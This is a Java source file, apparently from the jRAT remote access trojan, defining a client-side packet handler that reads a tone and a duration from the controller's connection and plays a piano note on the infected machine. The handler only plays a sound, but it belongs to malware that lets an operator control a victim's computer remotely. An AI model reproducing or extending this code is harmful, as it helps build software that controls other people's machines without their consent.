package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Piano;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;


public class Packet67LongPianoNote extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int tone = con.readInt();
		int time = con.readInt();
		AudioFormat af = new AudioFormat(Piano.SAMPLE_RATE, 8, 1, true, true);
		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
		dl.open(af, Piano.SAMPLE_RATE);
		dl.start();
		Piano.play(dl, Piano.values()[tone], time * 1000);
		dl.drain();
		dl.close();
	}

}
